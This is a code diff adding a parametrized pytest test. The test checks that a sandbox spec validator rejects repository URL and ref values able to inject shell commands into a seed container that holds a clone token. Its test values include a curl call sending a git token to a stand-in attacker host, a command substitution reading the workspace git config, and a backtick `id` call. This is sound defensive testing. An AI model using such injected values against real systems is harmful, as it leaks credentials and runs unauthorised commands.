@@ -72,6 +72,30 @@ def test_the_seed_shares_the_workspace_volume_with_the_server() -> None:
     assert seed["volumeMounts"] == pod["containers"][0]["volumeMounts"]
 
 
+@pytest.mark.parametrize(
+    "field,value",
+    [
+        ("url", "https://github.com/x/y.git; curl evil.example/$DEVAI_GIT_TOKEN"),
+        ("url", "ssh://github.com/x/y.git"),
+        ("ref", "main$(cat /workspace/.git/config)"),
+        ("ref", "`id`"),
+    ],
+)
+def test_a_repo_that_could_run_a_command_in_the_seed_is_refused(field: str, value: str) -> None:
+    """The spec comes from a caller, and the seed holds the clone token."""
+    from pydantic import ValidationError
+
+    with pytest.raises(ValidationError):
+        SandboxSpec.model_validate(
+            {
+                "agent": {"name": "dev", "version": "1"},
+                "model": {"provider": "anthropic", "model": "claude-sonnet-5"},
+                "workspace": True,
+                "repo": {**_REPO, field: value},
+            }
+        )
+
+
 # ── provisioning ──────────────────────────────────────────────────────
 
 
